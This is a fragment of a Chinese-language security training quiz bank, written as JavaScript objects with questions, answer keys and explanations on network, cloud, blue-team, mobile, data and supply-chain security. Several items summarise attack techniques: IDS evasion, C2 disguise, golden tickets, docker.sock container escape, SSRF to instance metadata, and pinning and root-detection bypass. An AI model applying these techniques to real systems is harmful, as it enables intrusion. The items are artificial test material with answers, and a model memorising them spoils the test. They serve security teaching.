  { id:"np14", cat:"network", level:"高级", q:"AS-REP Roasting 成立的前提是账户？", options:["关闭了 Kerberos 预认证（不要求预认证）","口令长度超过 14 位","启用了 NTLM","加入了信任域"], answer:0, explain:"无预认证时可直接请求 AS-REP 并离线爆破；应确保所有账户开启预认证。" },
  { id:"np15", cat:"network", level:"高级", q:"域环境里常见的权限维持手法是？", options:["伪造 Kerberos 票据（金票据 / 银票据）","修改 DNS 转发","安装杀毒软件","禁用主机防火墙"], answer:0, explain:"金票据伪造 TGT、银票据伪造 TGS，可长期以高权限访问；处置需重置 krbtgt 等关键账号。" },
  { id:"np16", cat:"network", level:"中级", q:"利用分片（fragmentation）绕过检测的原理是？", options:["把载荷切分，使特征无法在单个报文内匹配","加密流量无法被解密","改用 IPv6 即可绕过","降低发包速率"], answer:0, explain:"IDS 若不做报文重组就匹配不到跨包特征，而目标主机重组后仍能正常处理。" },
  { id:"np17", cat:"network", level:"中级", q:"针对基于特征的 IDS，最通用的规避思路是？", options:["改变编码/大小写/等价语法，使特征失配但目标仍能解析","关闭自身防火墙","更换代理 IP","提高带宽"], answer:0, explain:"URL 编码、内联注释、大小写混合都是常见做法；防御方需先规范化再匹配。" },
  { id:"np18", cat:"network", level:"中级", q:"出口限制严格的环境中，C2 流量最常伪装成？", options:["HTTPS/DNS 等常见协议","原始 IP 协议 0","大流量 UDP 直播","超大 ICMP 包"], answer:0, explain:"混入常见协议的 C2 最难被简单封禁拦住，需结合 TLS 指纹与行为分析检测。" },
  { id:"cp1", cat:"cloud", level:"入门", q:"在 IaaS 模式下，属于「客户」安全责任的是？", options:["物理机房安全","宿主机硬件维护","客户数据与访问配置","云厂商网络设备固件"], answer:2, explain:"IaaS 下客户负责镜像以上部分（系统补丁、数据、配置、身份）；物理与虚拟化层由厂商负责。" },
  { id:"cp2", cat:"cloud", level:"入门", q:"在 SaaS 模式下，客户的核心责任通常是？", options:["数据与账号权限管理","应用代码安全","操作系统补丁","虚拟化层安全"], answer:0, explain:"SaaS 的应用与平台由厂商负责，客户主要管好自己的数据、账号与配置。" },
  { id:"cp3", cat:"cloud", level:"初级", q:"云上「配置错误」成为最常见风险的主要原因是？", options:["安全边界从网络转向身份与配置，默认配置常过宽","云厂商不提供安全能力","云上无法审计","云网络不加密"], answer:0, explain:"云上一切由 API 配置驱动：一个公开的对象存储或过宽角色就等于敞开的门。" },
  { id:"cp4", cat:"cloud", level:"初级", q:"最小权限原则的核心是？", options:["只授予完成任务所需的最小权限并定期收敛","所有服务共用管理员密钥","给所有用户只读权限","关闭云审计日志"], answer:0, explain:"最小权限 + 定期复核 + 权限边界，能显著降低凭据泄露后的影响面。" },
  { id:"cp5", cat:"cloud", level:"中级", q:"云上长期访问密钥（AK/SK）泄露最危险之处在于？", options:["长期有效、可直接调用 API 且难以自动轮换","只能读不能写","必须配合口令才能使用","无法在云环境之外使用"], answer:0, explain:"长期密钥泄露后可被持续滥用；应改用角色与临时凭证（STS），并开启密钥轮换与异常调用检测。" },
  { id:"cp6", cat:"cloud", level:"初级", q:"更安全的云上身份方案是？", options:["使用角色 / 临时凭证（STS）替代长期密钥","把密钥写入镜像方便程序读取","用邮件传递密钥","关闭 MFA"], answer:0, explain:"临时凭证自动过期且可限定权限范围，暴露风险显著低于长期密钥。" },
  { id:"cp7", cat:"cloud", level:"高级", q:"以 privileged 模式运行的容器为何风险极高？", options:["几乎拥有宿主机全部能力与设备访问权限","只是日志更多","只影响容器内部","仅降低运行性能"], answer:0, explain:"privileged 容器可访问设备与内核接口，几乎等同宿主机 root；生产环境应禁止。" },
  { id:"cp8", cat:"cloud", level:"高级", q:"把 docker.sock 挂载进容器内的后果是？", options:["容器内可驱动 Docker 守护进程，等同获得宿主机 root","没有任何影响","只影响容器网络","只影响镜像构建速度"], answer:0, explain:"可借此创建特权容器并挂载宿主机根目录，是最常见的容器逃逸路径之一。" },
  { id:"cp9", cat:"cloud", level:"高级", q:"内核漏洞导致容器逃逸的根本原因是？", options:["容器与宿主机共享同一内核，隔离依赖内核机制","容器内没有文件系统","镜像未签名","未启用 HTTPS"], answer:0, explain:"隔离靠 namespace/cgroup 等内核能力，内核漏洞即可突破；需及时打补丁并使用安全运行时。" },
  { id:"cp10", cat:"cloud", level:"中级", q:"Kubernetes Pod 安全加固的基线手段是？", options:["限制特权、根文件系统只读、丢弃多余 capabilities、禁用 hostPath","只设置资源限额","只加注解说明","只修改镜像 tag"], answer:0, explain:"Pod Security 的基线/受限策略能挡掉绝大多数提权姿势，privileged 与 hostPath 最危险。" },
  { id:"cp11", cat:"cloud", level:"高级", q:"Kubernetes 中 RBAC 权限过宽的典型表现是？", options:["把 cluster-admin 或通配 verbs/resources 授予普通工作负载","未开启审计日志","使用 Helm 部署","部署在公有云上"], answer:0, explain:"通配权限让一个被攻陷的 Pod 能控制整个集群；应按需最小授权并禁止自动挂载 SA Token。" },
  { id:"cp12", cat:"cloud", level:"高级", q:"API Server 或 kubelet 未授权暴露的最直接后果是？", options:["攻击者可直接创建特权 Pod 获取节点权限","只会泄露监控指标","只影响日志记录","没有任何实际影响"], answer:0, explain:"认证/授权缺失等于把集群控制面交出去；kubelet 10250 匿名访问同样危险。" },
  { id:"cp13", cat:"cloud", level:"中级", q:"FaaS 中函数执行角色权限过大的典型风险是？", options:["函数被利用后可调用账号内其他云资源","函数无法被触发","冷启动变慢","只能读取日志"], answer:0, explain:"事件注入或依赖投毒后攻击者会继承函数角色权限；应按函数粒度最小授权。" },
  { id:"cp14", cat:"cloud", level:"中级", q:"Serverless 场景中的「事件注入」指的是？", options:["把恶意内容放入触发函数的事件数据，被拼接到命令/查询中执行","修改函数源码","伪造函数名称","关闭函数触发器"], answer:0, explain:"对象存储键名、HTTP 参数等事件字段都可能携带注入载荷，必须校验并参数化处理。" },
  { id:"cp15", cat:"cloud", level:"中级", q:"Serverless 的依赖风险为何格外突出？", options:["依赖来自公共仓库、随函数打包且更新滞后","函数不联网","函数没有日志","函数无网络访问"], answer:0, explain:"被投毒或含漏洞的依赖会随每次调用执行；应锁定版本、扫描依赖并定期重建。" },
  { id:"cp16", cat:"cloud", level:"中级", q:"SSRF 打云元数据服务时的典型目标地址是？", options:["169.254.169.254（IMDS）","127.0.0.1","8.8.8.8","224.0.0.1"], answer:0, explain:"IMDS 可返回实例临时凭证，进而横向控制云资源；应强制 IMDSv2 并限制跳数。" },
  { id:"cp17", cat:"cloud", level:"中级", q:"IMDSv2 相比 v1 的核心改进是？", options:["需先通过 PUT 获取 token 且限制跳数，显著抬高 SSRF 利用门槛","改为加密传输","变为只读接口","仅支持 IPv6"], answer:0, explain:"token 机制与 hop limit 让简单 SSRF 无法直接读取凭证，是必须开启的加固项。" },
  { id:"cp18", cat:"cloud", level:"中级", q:"发现云上临时凭证泄露后的处置顺序应是？", options:["先禁用或轮换凭证并查调用记录，再评估影响范围","先重装受影响主机","先通知全体员工","先删除全部日志"], answer:0, explain:"止血（断可用性）与留证（操作审计）并行；删除日志会破坏溯源链。" },
  { id:"bp1", cat:"blue", level:"初级", q:"SIEM 的核心能力是？", options:["多源日志集中存储 + 关联分析与告警","直接阻断攻击流量","替代防火墙","自动安装补丁"], answer:0, explain:"SIEM 负责汇聚、关联、检索与告警；阻断属于 IPS/EDR/防火墙的职责。" },
  { id:"bp2", cat:"blue", level:"初级", q:"决定检测能力上限最关键的因素是？", options:["日志源覆盖范围与保留期","界面是否美观","存储设备品牌","告警条数多少"], answer:0, explain:"没有日志就没有检测与溯源；先保证认证、边界、关键服务器日志接入且保留期足够。" },
  { id:"bp3", cat:"blue", level:"初级", q:"下列最应优先接入 SIEM 的日志是？", options:["认证/域控、边界设备与关键服务器的安全日志","打印机耗材状态","桌面壁纸变更记录","应用界面点击流"], answer:0, explain:"优先接入高价值安全事件源，最快形成有效检测能力。" },
  { id:"bp4", cat:"blue", level:"中级", q:"基于特征的 IDS 的固有短板是？", options:["难以发现未知攻击与变形绕过","完全无法处理流量","需要人工逐包点击确认","只能检测加密流量"], answer:0, explain:"特征库只覆盖已知模式，需配合行为/异常检测与威胁情报。" },
  { id:"bp5", cat:"blue", level:"中级", q:"IPS 与 IDS 的关键差别是？", options:["IPS 串接在链路中并可主动阻断","IPS 只记录日志","IDS 可以阻断流量","两者完全等价"], answer:0, explain:"IPS 在线串接能阻断但存在误杀风险；IDS 旁路只告警，不影响业务链路。" },
  { id:"bp6", cat:"blue", level:"中级", q:"降低 IDS 误报率的常见做法是？", options:["规则调优 + 白名单 + 结合情报与行为基线","直接关闭告警","把阈值调到不再报警","删除所有高危规则"], answer:0, explain:"误报治理靠上下文与基线，而不是关告警——关掉等于放弃检测。" },
  { id:"bp7", cat:"blue", level:"中级", q:"TLS 普及后，识别 C2 流量可行的信号是？", options:["TLS 指纹（JA3/JA4）、心跳周期性、DNS 异常与情报匹配","直接读取明文 URL","只看 IP 归属地","看报文长度是否为偶数"], answer:0, explain:"加密环境下要转向元数据与行为特征，并配合威胁情报做匹配。" },
  { id:"bp8", cat:"blue", level:"中级", q:"数据外传（exfiltration）的典型网络特征是？", options:["对单一目标的长时间稳定上传，常在非工作时段","短时广播风暴","少量 ICMP 回显请求","普通的域名 A 记录查询"], answer:0, explain:"稳定速率 + 长时长 + 非工作时段是经典外传画像，应建立流量基线并对偏离告警。" },
  { id:"bp9", cat:"blue", level:"中级", q:"检测 Beacon 心跳最有效的方法是？", options:["统计固定间隔的小流量会话并做周期性分析","只看端口号","只看目的 IP 数量","只看总带宽"], answer:0, explain:"心跳的规律性是最强特征；结合 jitter 分析与情报可显著提高准确率。" },
  { id:"bp10", cat:"blue", level:"高级", q:"勒索事件发生后，第一批动作的正确顺序是？", options:["隔离受影响主机与网段防扩散，同时保留现场与取证数据","立即全盘格式化","立即支付赎金","先重启所有服务器"], answer:0, explain:"先遏制、再取证、后恢复；格式化与盲目重启都会破坏证据并可能加速加密。" },
  { id:"bp11", cat:"blue", level:"高级", q:"为什么不建议第一时间重启或断电？", options:["会丢失内存证据，并可能中断尚未完成的取证与遏制","会损坏硬盘磁头","会导致机房断电","没有任何影响"], answer:0, explain:"内存中有加密密钥、进程与网络连接线索；应隔离并先做内存镜像再处置。" },
  { id:"bp12", cat:"blue", level:"高级", q:"恢复阶段最关键的验证是？", options:["确认备份未被污染且能干净还原（离线 / 不可变备份）","备份文件个数","备份软件品牌","备份压缩率"], answer:0, explain:"勒索常先破坏在线备份；恢复前必须在隔离环境验证还原结果的可用与洁净。" },
  { id:"bp13", cat:"blue", level:"初级", q:"IOC 与 IOA 的区别是？", options:["IOC 是静态指标（哈希/IP/域名），IOA 是攻击行为与手法特征","两者完全相同","IOA 只用于文件检测","IOC 只用于网络设备"], answer:0, explain:"IOC 见效快但易过期，IOA 难规避；两者结合效果最好。" },
  { id:"bp14", cat:"blue", level:"初级", q:"把威胁情报用于检测最直接的方式是？", options:["将 IOC 导入检测设备或日志检索做匹配","直接阻断所有外网访问","打印情报报告存档","关闭防火墙"], answer:0, explain:"情报必须落成可执行规则（匹配、检索、告警），否则只是阅读材料。" },
  { id:"bp15", cat:"blue", level:"中级", q:"威胁情报的「可执行性」指的是？", options:["能直接转成检测/阻断规则并可验证有效性","描述文字足够长","来自知名厂商","配有图表"], answer:0, explain:"可执行情报包含上下文（TTP、影响面）并能落成规则，这才是可用情报。" },
  { id:"bp16", cat:"blue", level:"初级", q:"EDR 与传统杀毒软件的核心区别是？", options:["基于行为与遥测持续检测与响应，而非仅靠特征匹配","只查本地病毒库","只做磁盘加密","只做补丁管理"], answer:0, explain:"EDR 关注进程行为链与响应动作（隔离、取证），对未知威胁更有效。" },
  { id:"bp17", cat:"blue", level:"初级", q:"终端遥测中对溯源最有价值的数据是？", options:["进程树与命令行、父子进程关系","桌面壁纸","屏幕分辨率","输入法设置"], answer:0, explain:"命令行与进程父子关系能还原完整攻击链，是 EDR 溯源的核心数据。" },
  { id:"bp18", cat:"blue", level:"中级", q:"EDR 的「隔离主机」动作的价值是？", options:["切断攻击者横向移动与 C2 通道，同时保留取证数据","删除主机全部文件","自动重装操作系统","关闭全部日志"], answer:0, explain:"网络隔离是遏制与取证的平衡做法；直接删除或重装会毁掉证据。" },

  // ---- 移动安全（v1.5.1 第二批：新增领域）----
  { id:"mob1", cat:"mobile", level:"入门", q:"为什么说「客户端不可信」？", options:["因为手机性能不足","因为 App 装在做题者/攻击者可控的设备上，可被逆向与改包","因为移动网络不安全","因为安卓开源"], answer:1, explain:"客户端代码与数据都在用户设备上，可被反编译、调试与篡改；安全校验必须放在服务端。" },
  { id:"mob2", cat:"mobile", level:"入门", q:"移动应用安全评估的三条主线通常指？", options:["客户端、数据存储、通信与接口","界面、性能、兼容性","安装、卸载、升级","广告、推送、统计"], answer:0, explain:"客户端（逆向/调试）、本地数据、通信与接口是移动安全的三个主要风险面。" },
  { id:"mob3", cat:"mobile", level:"初级", q:"重打包（改包）后必须做的一件事是？", options:["重新签名","重新申请包名","重新上架应用商店","重装系统"], answer:0, explain:"改动内容会让原签名失效，必须用自己的密钥重新签名，否则无法安装。" },
  { id:"mob4", cat:"mobile", level:"初级", q:"应用签名校验的作用是？", options:["保证安装包未被篡改、且来自该开发者","加密应用数据","提升运行速度","限制安装设备数量"], answer:0, explain:"签名是完整性与来源的凭证；改包后签名必然不一致。" },
  { id:"mob5", cat:"mobile", level:"初级", q:"AndroidManifest 中 exported=true 的组件意味着？", options:["可被其它应用调用，需要额外权限校验","只在应用内可用","必须系统签名","仅调试模式可见"], answer:0, explain:"导出组件是对外入口，若缺少权限/调用方校验就可能被越权调用。" },
  { id:"mob6", cat:"mobile", level:"初级", q:"用 adb 验证组件是否可被外部拉起，常用命令是？", options:["adb shell am start -n 包名/组件","adb install","adb logcat","adb reboot"], answer:0, explain:"am start 可直接拉起指定 Activity；同理 am broadcast、content query 验证广播与 Provider。" },
  { id:"mob7", cat:"mobile", level:"中级", q:"WebView 中 addJavascriptInterface 的风险是？", options:["网页中的 JS 可调用原生对象的方法，页面可控时可能越权读写本地数据","会拖慢页面加载","会禁用 JavaScript","只影响渲染样式"], answer:0, explain:"桥接暴露了原生能力，若加载的 URL 可控即可被恶意页面利用；应严格白名单并最小化暴露。" },
  { id:"mob8", cat:"mobile", level:"中级", q:"WebView 加固的正确做法是？", options:["严格控制加载域名白名单、关闭 file 协议、只暴露必要接口并校验参数","开启全部 JS 能力方便开发","允许加载任意 URL","把敏感方法都挂到桥对象上"], answer:0, explain:"WebView 要按不可信输入处理：白名单 + 最小暴露 + 参数校验。" },
  { id:"mob9", cat:"mobile", level:"入门", q:"下列哪项最容易导致本地敏感数据泄露？", options:["把令牌写入日志、SharedPreferences 明文存储并开启 allowBackup","使用 Keystore 保存密钥","关闭敏感日志","数据不落地"], answer:0, explain:"明文落盘 + 日志输出 + 可备份，三者叠加会让凭据暴露；应尽量不落地并用系统密钥库。" },
  { id:"mob10", cat:"mobile", level:"入门", q:"检测 App 是否把敏感信息写进日志，常用命令是？", options:["adb logcat | grep -i token","adb install","adb shell am start","adb shell dumpsys cpuinfo"], answer:0, explain:"logcat 过滤关键字（token/password/secret）能快速发现敏感日志。" },
  { id:"mob11", cat:"mobile", level:"初级", q:"证书固定（Certificate Pinning）的作用是？", options:["把信任范围收窄到指定证书/公钥，降低自签根证书代理抓包的成功率","加密本地文件","提升下载速度","防止应用被重打包"], answer:0, explain:"Pinning 让仅凭系统信任链的中间人失效；但可被运行时 hook 绕过，服务端仍需鉴权。" },
  { id:"mob12", cat:"mobile", level:"初级", q:"在授权测试中遇到证书固定导致抓包失败，常见处理方式是？", options:["用 Frida hook 掉 X509TrustManager/CertificatePinner 等校验点","直接放弃测试","关闭手机 Wi-Fi","改用 HTTP 明文接口"], answer:0, explain:"动态 hook 校验函数是标准绕过手段；注意这是测试手段，不代表线上可被轻易利用。" },
  { id:"mob13", cat:"mobile", level:"中级", q:"Frida 在移动测试中的主要用途是？", options:["运行时 hook 函数、修改返回值、观察真实行为","静态反编译 dex","打包签名","抓取网络包"], answer:0, explain:"Frida 是动态分析核心工具；静态反编译用 jadx/Ghidra，抓包用代理。" },
  { id:"mob14", cat:"mobile", level:"中级", q:"App 检测到调试器就退出，这类防护的定位是？", options:["提高分析成本，但可被绕过，不能作为唯一防线","彻底阻断逆向","等同服务端鉴权","属于加密手段"], answer:0, explain:"反调试/反 Root 属军备竞赛，只能提高门槛；真正的防线是服务端校验与数据最小化。" },
  { id:"mob15", cat:"mobile", level:"中级", q:"绕过 Root 检测最常用的工程化做法是？", options:["用 Magisk 的隐藏能力（DenyList/Zygisk）并配合 hook 返回假值","卸载所有安全软件","改用 iPhone","关闭开发者选项"], answer:0, explain:"隐藏 Root 痕迹 + hook 检测点为假值，是标准组合拳；但仍可能被云端完整性校验发现。" },
  { id:"mob16", cat:"mobile", level:"中级", q:"对抗「越狱/Root 检测」时最关键的评估产出是？", options:["绕过之后攻击者究竟能获得什么权限与数据","检测代码有多少行","使用了哪种编程语言","厂商名称"], answer:0, explain:"绕过本身不是目的，要评估由此带来的真实越权后果与影响面。" },
  { id:"mob17", cat:"mobile", level:"高级", q:"脱壳（dump dex）通常发生在什么时候？", options:["应用启动、壳完成解密、真实代码已加载到内存之后","安装过程中","下载 APK 之前","卸载之后"], answer:0, explain:"抽取式壳在运行时才解密出真实代码，必须在内存中 dump 再修复 dex。" },
  { id:"mob18", cat:"mobile", level:"高级", q:"OLLVM 控制流平坦化给逆向带来的主要困难是？", options:["打乱控制流，使逻辑难以还原，需要去平坦化分析","加密网络流量","隐藏应用图标","禁用调试端口"], answer:0, explain:"控制流平坦化会显著增加静态分析成本，常需配合动态 trace 与脚本化还原。" },
  { id:"mob19", cat:"mobile", level:"初级", q:"iOS 应用包（IPA）解包后应优先关注什么？", options:["Info.plist 中的 ATS 例外、URL Scheme 与权限配置","图片资源数量","字体大小","应用图标样式"], answer:0, explain:"ATS 放宽与 URL Scheme 暴露是 iOS 侧常见风险点，先看配置再看二进制。" },
  { id:"mob20", cat:"mobile", level:"初级", q:"iOS 侧存储敏感数据更推荐的方式是？", options:["Keychain（并正确设置访问控制）","明文写入 plist","写进 NSUserDefaults","写进日志"], answer:0, explain:"Keychain 由系统加密保管；plist/UserDefaults 明文易被读取，日志更会直接泄露。" },
  { id:"mob21", cat:"mobile", level:"中级", q:"移动端接口最常见的越权类型是？", options:["水平越权：改 id 就能看/改他人数据","接口不支持 HTTPS","接口返回 JSON","接口使用 REST 风格"], answer:0, explain:"服务端只校验登录、不校验数据归属，是移动接口最典型的漏洞。" },
  { id:"mob22", cat:"mobile", level:"中级", q:"为什么「客户端加密/签名」不能替代服务端校验？", options:["因为客户端逻辑可被逆向与重放，攻击者能绕过或复现签名流程","因为加密速度慢","因为会增大包体","因为不受开发者控制"], answer:0, explain:"客户端签名只能抬高改包成本，无法阻止脚本化调用与重放；鉴权与风控必须在服务端。" },
  { id:"mob23", cat:"mobile", level:"中级", q:"评估移动接口是否可被批量滥用，最直接的验证是？", options:["对同一接口高频重复调用，观察是否有频率限制与风控拦截","查看接口返回码个数","统计接口文档页数","检查是否用了 CDN"], answer:0, explain:"缺少限流与风控会导致枚举/撞库/羊毛；需实测确认。" },
  { id:"mob24", cat:"mobile", level:"高级", q:"移动恶意样本最常申请的敏感权限/能力是？", options:["无障碍服务、短信与通话权限","蓝牙配对","屏幕亮度调节","振动"], answer:0, explain:"无障碍服务可读屏与自动点击、短信权限可窃取验证码，二者是移动恶意的常见组合。" },
  { id:"mob25", cat:"mobile", level:"高级", q:"分析移动恶意样本时提取 IOC 的主要来源是？", options:["静态字符串中的域名/URL 与运行时抓包得到的 C2","应用图标的配色","安装包体积","开发者签名算法"], answer:0, explain:"域名、URL、C2 地址是 IOC 核心，静态提取与动态抓包互相补充。" },
  { id:"mob26", cat:"mobile", level:"高级", q:"多阶段载荷（下载器 + 二次加载）对分析的影响是？", options:["核心恶意逻辑不在初始包中，需要动态跟踪后续加载","样本无法运行","不需要分析网络行为","只能在静态阶段发现"], answer:0, explain:"二次加载要求动态分析跟踪落地文件与解密过程，否则无法看清真实行为。" },

  // ---- 数据安全与隐私 / 供应链安全（v1.5.1 第三批）----
  { id:"ds1", cat:"datasec", level:"入门", q:"数据分类分级的首要作用是？", options:["决定该数据需要多强的保护与审批流程","提升数据库性能","减少存储成本","方便做报表"], answer:0, explain:"分级是数据安全的地基：加密强度、访问审批、脱敏与留存策略都由等级驱动。" },
  { id:"ds2", cat:"datasec", level:"入门", q:"数据生命周期通常不包括下列哪一项？", options:["生物特征采集认证","采集","存储与使用","销毁"], answer:0, explain:"生命周期一般指采集—传输—存储—使用—共享—销毁；生物特征认证属于身份技术，不在其列。" },
  { id:"ds3", cat:"datasec", level:"初级", q:"发现某数据库列名含 phone、id_card 等关键字，下一步应该？", options:["抽样核查内容并纳入分级与脱敏范围","直接删除这些列","忽略，列名不代表什么","关闭数据库审计"], answer:0, explain:"列名只是线索，需抽样验证准确率后纳入分级，并驱动加密/脱敏/审计。" },
  { id:"ds4", cat:"datasec", level:"初级", q:"给测试环境提供生产数据时，正确做法是？", options:["先脱敏或使用合成数据","直接复制生产库","只改表名","只做权限限制"], answer:0, explain:"测试环境安全水位低，直接复制生产数据会放大泄露面；应脱敏或使用合成数据。" },
  { id:"ds5", cat:"datasec", level:"中级", q:"DLP 上线初期最稳妥的策略是？", options:["先观察记录、统计误报，再逐步收紧阻断","直接全量阻断所有外发","只做终端不做网络","只对高管启用"], answer:0, explain:"直接阻断会引发业务绕过；观察—收敛—常态化是已被验证的路径。" },
  { id:"ds6", cat:"datasec", level:"中级", q:"下列哪种做法最可能让 DLP 失效？", options:["员工把文件压缩加密后通过个人网盘外发","使用公司邮箱发送","在终端复制文件","打印文件"], answer:0, explain:"压缩加密与个人通道会绕过基于内容识别的 DLP；需结合终端管控、通道封禁与审计。" },
  { id:"ds7", cat:"datasec", level:"初级", q:"脱敏后仍需评估「重标识风险」的原因是？", options:["保留生日、邮编等准标识符组合后仍可能反推出个人身份","脱敏会降低性能","脱敏成本高","法规禁止脱敏"], answer:0, explain:"掩码不等于匿名，准标识符组合可重标识；需做 k-匿名等风险评估。" },
  { id:"ds8", cat:"datasec", level:"初级", q:"关于脱敏与假名化，说法正确的是？", options:["假名化数据在合规上通常仍属个人信息","假名化等同于完全匿名","脱敏可以随意恢复","掩码后即可公开"], answer:0, explain:"假名化只是替换标识，借助映射表仍可还原，因此仍受个人信息保护规则约束。" },
  { id:"ds9", cat:"datasec", level:"中级", q:"密钥管理中最容易被忽视但最致命的问题是？", options:["密钥与数据放在一起，或硬编码在代码/配置里","密钥长度不够","使用 AES 而非国密","未使用 HSM"], answer:0, explain:"密钥泄露等于没加密；密钥必须与数据分离并放入 KMS/HSM，禁止硬编码。" },
  { id:"ds10", cat:"datasec", level:"中级", q:"信封加密（Envelope Encryption）的核心思想是？", options:["用数据密钥加密数据，再用主密钥加密数据密钥，密钥分层便于轮换与控制","对文件加密两次","用两个相同密钥","先压缩再加密"], answer:0, explain:"分层密钥让数据密钥可频繁轮换，而主密钥始终留在 KMS/HSM 中。" },
  { id:"ds11", cat:"datasec", level:"初级", q:"数据权限治理中「权限复核」主要解决什么问题？", options:["长期累积的过期授权（如离职人员、岗位变更后仍保留的权限）","数据库性能","备份速度","日志体积"], answer:0, explain:"权限只增不减会形成隐性高权限；定期复核与回收是核心动作。" },
  { id:"ds12", cat:"datasec", level:"初级", q:"行级权限（Row Level Security）的典型用途是？", options:["让用户只能看到自己负责的数据行","加密整张表","提升查询速度","限制字段长度"], answer:0, explain:"行级权限把数据归属变成强制规则，避免仅靠应用层过滤被绕过。" },
  { id:"ds13", cat:"datasec", level:"中级", q:"数据审计日志至少要记录？", options:["账号、时间、来源、对象、动作与影响范围","只有操作时间","只有账号名","只有错误信息"], answer:0, explain:"缺任何一项都难以定责或评估影响范围；日志本身还需防篡改与集中留存。" },
  { id:"ds14", cat:"datasec", level:"中级", q:"审计中发现某账号在离职前一周大量导出数据，最应优先做什么？", options:["立即冻结该账号并固定证据、核查导出范围","先通知本人解释","等离职当天再看","只删除日志"], answer:0, explain:"离职前集中导出是典型内部威胁信号，先止血与留证，再评估影响与定责。" },
  { id:"ds15", cat:"datasec", level:"入门", q:"个人信息保护中的「告知同意」要求？", options:["事前告知用途并取得同意，且同意可撤回","只要不泄露就无需告知","用户注册即代表同意一切","口头约定即可"], answer:0, explain:"告知同意是合规基础：用途明确、同意有效、可撤回，且敏感信息需单独同意。" },
  { id:"ds16", cat:"datasec", level:"入门", q:"「最小必要」原则的含义是？", options:["只收集实现功能所必需的个人信息，并只保留必要期限","尽量少收但可无限期保存","只要用户同意就能随便收","只在节假日收集"], answer:0, explain:"最小必要同时约束字段范围与留存期限，收多了就是风险。" },
  { id:"ds17", cat:"datasec", level:"初级", q:"埋点采集最容易踩的隐私红线是？", options:["采集输入框内容、剪贴板等远超分析需要的数据","统计页面访问量","记录接口耗时","统计错误码"], answer:0, explain:"埋点越界是最常见的隐私问题；应只采聚合指标，避免采集内容本身。" },
  { id:"ds18", cat:"datasec", level:"初级", q:"用户行使「删除权」时，工程上必须保证？", options:["主库、副本、备份与第三方同步链路都能删除或匿名化","只删主库即可","只需在产品界面隐藏","延后一年处理"], answer:0, explain:"数据分散在多处，删除请求必须在全链路生效，否则合规上不成立。" },
  { id:"ds19", cat:"datasec", level:"高级", q:"数据出境合规的第一步通常是？", options:["做数据出境盘点：系统、字段、接收方、国家地区与用途","直接签标准合同","先上线再补材料","关闭所有跨境访问"], answer:0, explain:"没有清单就无法判断路径与必要性；盘点后本地化或选择相应合规路径。" },
  { id:"ds20", cat:"datasec", level:"高级", q:"下列哪种情形通常必须单独取得同意？", options:["向第三方提供个人信息或处理敏感个人信息","统计站点访问量","记录系统错误","压缩日志"], answer:0, explain:"对外提供与敏感个人信息处理属单独同意场景，需单独告知并留痕。" },
  { id:"ds21", cat:"datasec", level:"高级", q:"数据泄露事件处置的正确顺序是？", options:["隔离与止血 → 固定证据 → 评估影响 → 依法通报与告知 → 整改复盘","先对外道歉再慢慢查","先删除日志保护隐私","先通知媒体"], answer:0, explain:"顺序错了会导致证据丢失或影响扩大；留证与通报时限都要满足合规要求。" },
  { id:"ds22", cat:"datasec", level:"高级", q:"判断泄露影响范围时，最关键的评估维度是？", options:["数据类型与等级、可识别性（能否重标识）与涉及人数","日志文件大小","服务器数量","事件持续秒数"], answer:0, explain:"影响评估要围绕数据敏感度与可识别性，才能决定通报范围与补救措施。" },
  { id:"ds23", cat:"datasec", level:"中级", q:"防御内部人员权限滥用最有效的一组措施是？", options:["最小权限 + 行为基线告警 + 高敏操作双人复核","全员只读","关闭所有审计日志","只依赖员工自觉"], answer:0, explain:"技术收敛 + 行为发现 + 流程制衡三者缺一不可。" },
  { id:"ds24", cat:"datasec", level:"中级", q:"离职流程中与数据安全最相关的一项动作是？", options:["当天回收全部账号与权限并检查近期导出记录","退还门禁卡","交接文档","回收电脑"], answer:0, explain:"账号与权限回收不及时是内部威胁的主要窗口；同时核查有无异常导出。" },
  { id:"ds25", cat:"datasec", level:"高级", q:"备份「不可变（WORM）」的价值是？", options:["即使管理凭据被窃取，攻击者也无法在保留期内删除或覆盖备份","节省存储空间","提高备份速度","减少备份数量"], answer:0, explain:"勒索攻击常先毁备份；不可变或离线副本是最后的恢复保证。" },
  { id:"ds26", cat:"datasec", level:"高级", q:"验证备份是否真的可用的正确方式是？", options:["定期做恢复演练并记录实测 RTO/RPO","看备份文件大小是否正常","看备份任务是否显示成功","看备份软件版本"], answer:0, explain:"未经验证的备份不算备份；演练要覆盖最坏场景并记录恢复耗时与数据丢失窗口。" },
  { id:"sc1", cat:"supply", level:"入门", q:"软件供应链安全主要关注的是？", options:["构成软件的依赖、构建与分发链路是否可信","服务器机房温湿度","员工考勤","显示器品牌"], answer:0, explain:"供应链风险分布在依赖、构建工具、制品与分发通道，而非单一节点。" },
  { id:"sc2", cat:"supply", level:"入门", q:"为什么一次供应链攻击能影响大量单位？", options:["被攻击的组件/更新通道被广泛复用，形成一对多的放大效应","因为攻击者数量多","因为网络带宽大","因为用户不看新闻"], answer:0, explain:"公共依赖与更新通道的复用性放大了影响面，效率极高。" },
  { id:"sc3", cat:"supply", level:"初级", q:"SBOM 的作用是？", options:["记录软件由哪些组件与版本构成，便于快速判断是否受新漏洞影响","提升编译速度","压缩安装包","加密源代码"], answer:0, explain:"SBOM 是影响面判定的基础；没有它，0day 出现时只能靠猜。" },
  { id:"sc4", cat:"supply", level:"初级", q:"SBOM 常见的两种格式是？", options:["SPDX 与 CycloneDX","JSON 与 XML","ZIP 与 TAR","CSV 与 YAML"], answer:0, explain:"SBOM 标准化格式主要是 SPDX 与 CycloneDX，便于工具链互通。" },
  { id:"sc5", cat:"supply", level:"初级", q:"依赖漏洞响应中，优先级排序应考虑？", options:["漏洞可利用性、是否可达、是否暴露在公网","依赖包的下载量","依赖包的名字长度","引入时间先后"], answer:0, explain:"按可利用性与实际暴露面排序，才能把有限人力用在真实风险上。" },
  { id:"sc6", cat:"supply", level:"初级", q:"锁文件（lockfile）在依赖管理中的作用是？", options:["固定依赖树的具体版本，保证构建可重复并便于审计","加快下载速度","减小仓库体积","自动修复漏洞"], answer:0, explain:"lockfile 锁定传递依赖版本，是构建一致性与依赖审计的前提。" },
  { id:"sc7", cat:"supply", level:"中级", q:"SCA 工具最常见的落地问题是？", options:["告警过多且无人判定，最终被忽略","扫描速度太慢","不支持中文","占用磁盘过大"], answer:0, explain:"SCA 的价值取决于闭环：有人判定、有 SLA、有修复验证，否则只是噪音。" },
